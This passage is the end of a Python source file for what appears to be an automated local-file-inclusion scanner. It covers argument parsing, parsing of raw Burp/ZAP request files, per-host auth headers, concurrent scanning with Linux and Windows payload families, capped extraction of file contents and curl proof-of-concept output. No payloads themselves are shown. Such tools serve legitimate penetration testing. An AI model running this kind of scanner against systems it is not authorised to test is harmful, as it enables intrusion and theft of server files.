                        "(default 3, 0 for no cap). Proving the same flaw on "
                        "yet another parameter of the same page costs requests "
                        "and adds nothing to the report")
    p.add_argument("-t", "--threads", type=int, default=4,
                   help="concurrent targets (default 4)")
    p.add_argument("-d", "--delay", type=float, default=0.0,
                   help="minimum gap between requests (s), enforced globally")
    p.add_argument("--timeout", type=float, default=20.0, help="request timeout")
    p.add_argument("-H", "--header", action="append", default=[],
                   help="extra header 'Name: value' (repeatable)")
    p.add_argument("-x", "--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("--auth-file", metavar="FILE",
                   help="headers to authenticate with, -H syntax, one per "
                        "line, '#' for comments. Applied to EVERY target "
                        "whatever the file is called")
    p.add_argument("--auth-dir", metavar="DIR",
                   help="directory of auth files named after the host they "
                        "authenticate: www.example.com.txt covers every port "
                        "of that host, www.example.com_8080.txt covers that "
                        "port only and wins over it. No subdomain "
                        "inheritance. Only the host a file names receives its "
                        "headers, which is what -H cannot do in -l mode. "
                        "Mutually exclusive with --auth-file")
    return p


def load_urls(path):
    out = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for ln in fh:
            ln = ln.strip()
            if ln and not ln.startswith("#"):
                out.append(ln)
    return out


# ----------------------------------------------------------------------------
# raw HTTP request (-r)
# ----------------------------------------------------------------------------

# Headers from the request file we must not forward verbatim: requests derives
# them (Host from the URL, Content-Length from the body) or they break parsing
# (Accept-Encoding -> a compressed body, br needing a lib requests may lack).
_RAW_SKIP_HEADERS = frozenset({
    "host", "content-length", "connection", "proxy-connection", "keep-alive",
    "accept-encoding", "transfer-encoding", "te",
})


@dataclass
class RequestSpec:
    method: str
    url: str
    headers: dict                                    # replayed on every request
    body_params: dict = field(default_factory=dict)  # urlencoded body (name->value)


def _infer_scheme(headers: dict) -> str:
    """http by default; https if an Origin/Referer is itself https."""
    for h in ("Origin", "Referer"):
        v = headers.get(h) or headers.get(h.lower())
        if v and v.lower().startswith("https://"):
            return "https"
        if v and v.lower().startswith("http://"):
            return "http"
    return "http"


def parse_raw_request(path: str, force_ssl: bool = False) -> RequestSpec:
    """
    Parse a raw HTTP request file (Burp/ZAP export) into a RequestSpec: method,
    absolute URL, headers to replay, and urlencoded body parameters. The scheme
    is http by default (inferred from Origin/Referer, or forced with
    --force-ssl) since an origin-form request line does not carry one.
    """
    with open(path, "rb") as fh:
        text = fh.read().decode("utf-8", errors="replace").replace("\r\n", "\n")

    head, _, body = text.partition("\n\n")
    lines = head.split("\n")
    while lines and not lines[0].strip():
        lines.pop(0)
    if not lines:
        raise ValueError("empty request file")

    parts = lines[0].strip().split()
    if len(parts) < 2:
        raise ValueError(f"invalid request line: {lines[0]!r}")
    method, target = parts[0].upper(), parts[1]

    headers: dict = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, _, v = ln.partition(":")
            if k.strip():
                headers[k.strip()] = v.strip()

    host = headers.get("Host") or headers.get("host")
    if target.startswith(("http://", "https://")):
        url = target
        if force_ssl and url.startswith("http://"):
            url = "https://" + url[len("http://"):]
    else:
        if not host:
            raise ValueError("no Host header and non-absolute URI: "
                             "cannot build the URL")
        scheme = "https" if force_ssl else _infer_scheme(headers)
        if not target.startswith("/"):
            target = "/" + target
        url = f"{scheme}://{host}{target}"

    fwd = {k: v for k, v in headers.items() if k.lower() not in _RAW_SKIP_HEADERS}

    body_params: dict = {}
    body = body.strip()
    if body:
        ctype = next((v.lower() for k, v in headers.items()
                      if k.lower() == "content-type"), "")
        looks_form = ("urlencoded" in ctype
                      or ("=" in body and not body.lstrip().startswith(("{", "["))))
        if looks_form:
            pairs = parse_qsl(body, keep_blank_values=True)
            if pairs:
                body_params = dict(pairs)
    return RequestSpec(method, url, fwd, body_params)


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)

    if args.no_color or os.environ.get("NO_COLOR"):
        set_color(False)

    # -p used to mean --proxy here, as it still does in the other tools.
    # Silently treating a proxy URL as a parameter name would produce a scan
    # that looks normal and tests a parameter nothing will ever read, so say it
    # out loud instead.
    if args.param and re.match(r"^(?:https?|socks\d?)://", args.param.strip()):
        print(f"error: -p now names the parameter to test, not the proxy — "
              f"use -x {args.param} (or --proxy)", file=sys.stderr)
        return 2

    # Both families disabled leaves no payload to send. Failing loudly beats
    # running to completion and reporting "no findings" from zero requests.
    if args.no_windows and args.no_linux:
        print("error: --no-windows and --no-linux together disable every "
              "payload family; there would be nothing to test", file=sys.stderr)
        return 2

    if args.auth_file and args.auth_dir:
        print("error: --auth-file and --auth-dir are mutually exclusive",
              file=sys.stderr)
        return 2

    # -r takes precedence: a single target described by a raw request file
    spec = None
    req_header_list = []
    if args.request:
        if not os.path.isfile(args.request):
            print(f"error: no such file: {args.request}", file=sys.stderr)
            return 2
        try:
            spec = parse_raw_request(args.request, force_ssl=args.force_ssl)
        except Exception as e:
            print(f"error: cannot parse request ({args.request}): {e}",
                  file=sys.stderr)
            return 2
        if args.url or args.list:
            print("note: -r takes precedence; -u/-l ignored", file=sys.stderr)
        urls = [spec.url]
        # request headers first, -H after (so -H can override)
        req_header_list = [f"{k}: {v}" for k, v in spec.headers.items()]
    else:
        urls = []
        if args.url:
            urls.append(args.url)
        if args.list:
            if not os.path.isfile(args.list):
                print(f"error: no such file: {args.list}", file=sys.stderr)
                return 2
            urls.extend(load_urls(args.list))
        urls = list(dict.fromkeys(urls))
    if not urls:
        print("error: no targets (use -u, -l or -r)", file=sys.stderr)
        return 2

    con = Console(args.verbosity)
    try:
        auth = AuthStore.load(args.auth_file, args.auth_dir, con)
    except ValueError as e:
        print(f"error: {e}", file=sys.stderr)
        return 2
    status = Status(con, len(urls), interval=args.status_interval,
                    enabled=bool(args.list))

    fams = []
    if not args.no_linux:
        fams.append("linux")
    if not args.no_windows:
        fams.append("windows")

    print(paint(BANNER, "head"))
    print(f"  targets {paint(str(len(urls)), 'b')}   threads {args.threads}   "
          f"timeout {args.timeout:.0f}s   depth {args.depth}")
    print(f"  payloads {paint(' + '.join(fams), 'b')}"
          f"      exfil {paint(f'capped {EXFIL_MAX_LINES} lines / {EXFIL_MAX_BYTES} B', 'ok')}"
          + (f"      status every {args.status_interval:.0f}s"
             if status.enabled else ""))
    print()

    auth.describe(con)
    http = Http(con, timeout=args.timeout, delay=args.delay, proxy=args.proxy,
                extra_headers=args.header, req_headers=req_header_list,
                auth=auth)
    hunter = LfiHunter(http, con, args, status)
    if spec is not None:
        # cookie replayed in the curl PoC so a finding is reproducible as-is
        hunter._poc_cookie = next((v for k, v in spec.headers.items()
                                   if k.lower() == "cookie"), "")

    started = time.time()
    status.start()

    def one(u):
        try:
            if spec is not None:
                hunter.run_request(spec)
            else:
                hunter.run_target(u)
        except Exception as e:
            con.error(f"{u}: {type(e).__name__}: {e}")
        finally:
            status.host_done()

    try:
        if args.threads > 1 and len(urls) > 1:
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=args.threads) as pool:
                list(pool.map(one, urls))
        else:
            for u in urls:
                one(u)
    except KeyboardInterrupt:
        con.error("interrupted by user")
    finally:
        status.stop()
        status.emit(label="final")

    elapsed = time.time() - started
    real = [f for f in hunter.findings if f.sev != INFO]
    print(f"\n  {paint(str(len(real)), 'b')} finding(s) from {http.count} "
          f"requests in {elapsed:.0f}s")
    for sev in (CRIT, HIGH, MED, LOW):
        n = sum(1 for f in hunter.findings if f.sev == sev)
        if n:
            print(f"    {paint(sev, sev):<20} {n}")
    if hunter.deduped:
        print(f"  {paint('deduplicated', 'ok')}: {hunter.deduped} injection "
              f"point(s) on already-tested route templates not retested")
    if hunter.skipped:
        print(f"  {paint('skipped', 'warn')}: {len(hunter.skipped)}")
        for s in hunter.skipped[:10]:
            print(f"    - {s['url']}  [{s['reason']}]")
    return 0 if not real else 1


if __name__ == "__main__":
    sys.exit(main())
